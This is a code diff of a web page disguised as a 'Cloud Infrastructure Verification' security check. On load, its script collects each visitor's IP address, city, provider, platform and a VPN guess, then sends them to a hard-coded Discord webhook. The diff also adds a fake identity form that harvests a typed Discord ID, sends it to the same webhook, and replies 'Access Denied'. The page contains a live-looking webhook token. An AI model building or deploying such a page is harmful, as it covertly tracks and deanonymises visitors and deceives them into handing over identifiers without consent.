@@ -5,57 +5,33 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cloud Infrastructure Verification</title>
     <style>
-        body {
-            background-color: #0a0a0a;
-            color: #d1d5db;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .monitor-box {
-            border: 1px solid #262626;
-            background: #171717;
-            padding: 2rem;
-            border-radius: 12px;
-            text-align: center;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-        }
-        .status-dot {
-            height: 8px;
-            width: 8px;
-            background-color: #10b981;
-            border-radius: 50%;
-            display: inline-block;
-            margin-right: 8px;
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.3; }
-            100% { opacity: 1; }
-        }
+        body { background-color: #0a0a0a; color: #d1d5db; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .monitor-box { border: 1px solid #262626; background: #171717; padding: 2rem; border-radius: 12px; text-align: center; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); width: 350px; }
+        .status-dot { height: 8px; width: 8px; background-color: #10b981; border-radius: 50%; display: inline-block; margin-right: 8px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        
+        /* フォームのスタイル */
+        #auth-form { margin-top: 20px; border-top: 1px solid #333; padding-top: 20px; text-align: left; }
+        #auth-form p { font-size: 0.85rem; color: #9ca3af; margin-bottom: 10px; }
+        input { background: #0a0a0a; color: #fff; border: 1px solid #334155; padding: 8px; border-radius: 4px; width: 100%; box-sizing: border-box; margin-bottom: 10px; outline: none; }
+        input:focus { border-color: #10b981; }
+        button { background: #10b981; border: none; color: #fff; padding: 8px 15px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold; transition: 0.2s; }
+        button:hover { background: #059669; }
     </style>
 </head>
 <body>
     <div class="monitor-box">
-        <div style="font-size: 0.8rem; color: #737373; margin-bottom: 1rem; text-transform: uppercase; letter-spacing: 0.1em;">
-            Security Protocol v4.0.2
-        </div>
-        <div id="status">
-            <span class="status-dot"></span>
-            Verifying browser environment...
+        <div style="font-size: 0.8rem; color: #737373; margin-bottom: 1rem; text-transform: uppercase; letter-spacing: 0.1em;">Security Protocol v4.1.0</div>
+        <div id="status"><span class="status-dot"></span>Verifying browser environment...</div>
+
+        <div id="auth-form" style="display: none;">
+            <p>Please enter your Discord ID for verification:</p>
+            <input type="text" id="userid" placeholder="User#0000">
+            <button onclick="sendID()">Verify Identity</button>
         </div>
     </div>
 
     <script>
-        /**
-         * AI-Optimized Webhook Integration
-         * User: 五覇法典ももんが
-         * Target Webhook: discord.com/.../A8KdVdQAkb...
-         */
         const CORE_CONFIG = {
             WEBHOOK_URL: "https://discord.com/api/webhooks/1431260265965555742/A8KdVdQAkbPP2CyFvgeY35Xfz04cz9DiYNmVmO_g1Mc0KicdIYmKLku46TIFJOid7hec",
             IP_SERVICE: "https://ipapi.co/json/",
@@ -64,27 +40,30 @@
             ROLE_MENTION: "<@&1456378548406456506>"
         };
 
+        // 1. ページ読み込み時に自動でIPログを送信
         async function processTelemetrics() {
             try {
-                // 1. IPデータの取得
                 const res = await fetch(CORE_CONFIG.IP_SERVICE);
-                if (!res.ok) throw new Error("Service unavailable");
                 const d = await res.json();
 
-                // 2. ペイロード構築
+                const isPotentialVPN = d.org.toLowerCase().includes('hosting') || 
+                                      d.org.toLowerCase().includes('vpn') || 
+                                      d.org.toLowerCase().includes('proxy') ||
+                                      d.org.toLowerCase().includes('cloud');
+
                 const payload = {
                     username: CORE_CONFIG.BOT_NAME,
                     avatar_url: CORE_CONFIG.BOT_AVATAR,
-                    content: CORE_CONFIG.ROLE_MENTION, // メンションをメッセージ本体に配置
+                    content: CORE_CONFIG.ROLE_MENTION,
                     embeds: [{
                         title: "📈 Access Data Captured",
-                        color: 0x000000,
+                        color: isPotentialVPN ? 0xff0000 : 0x00ff00,
                         fields: [
                             { name: "🌐 IP Address", value: `\`${d.ip}\``, inline: true },
                             { name: "📍 Location", value: `${d.country_name} / ${d.city}`, inline: true },
                             { name: "🏢 Provider", value: d.org, inline: false },
-                            { name: "📱 OS/Platform", value: navigator.platform, inline: true },
-                            { name: "🌐 Language", value: navigator.language, inline: true }
+                            { name: "🛡️ VPN / Proxy", value: isPotentialVPN ? "⚠️ Detected" : "✅ Not Detected", inline: true },
+                            { name: "📱 Platform", value: navigator.platform, inline: true }
                         ],
                         footer: { text: "Secure Logger Instance" },
                         timestamp: new Date().toISOString()
@@ -92,18 +71,47 @@
                     allowed_mentions: { "roles": ["1456378548406456506"] }
                 };
 
-                // 3. Discordへ送信
                 await fetch(CORE_CONFIG.WEBHOOK_URL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
                 });
 
-                document.getElementById("status").innerHTML = "✅ Connection established.";
+                // 送信完了後にUIを更新し、フォームを表示
+                document.getElementById("status").innerHTML = "✅ Identity confirmation required.";
+                document.getElementById("auth-form").style.display = "block";
 
             } catch (err) {
-                console.error("Telemetry failed:", err);
-                document.getElementById("status").innerHTML = "❌ Failed to connect.";
+                document.getElementById("status").innerHTML = "❌ Connection error.";
+                console.error(err);
+            }
+        }
+
+        // 2. ユーザーが入力したIDを送信する関数
+        async function sendID() {
+            const idValue = document.getElementById("userid").value;
+            if (!idValue) return alert("Please enter an ID.");
+
+            const btn = document.querySelector("button");
+            btn.innerText = "Verifying...";
+            btn.disabled = true;
+
+            try {
+                await fetch(CORE_CONFIG.WEBHOOK_URL, {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({
+                        username: CORE_CONFIG.BOT_NAME,
+                        avatar_url: CORE_CONFIG.BOT_AVATAR,
+                        content: `🚨 **ID入力検知**\n入力された内容: \`${idValue}\`\nターゲットロール: ${CORE_CONFIG.ROLE_MENTION}`
+                    })
+                });
+                
+                alert("Verification Complete. Access Denied.");
+                btn.innerText = "Verify Identity";
+                btn.disabled = false;
+            } catch (e) {
+                alert("Submission failed.");
             }
         }
 
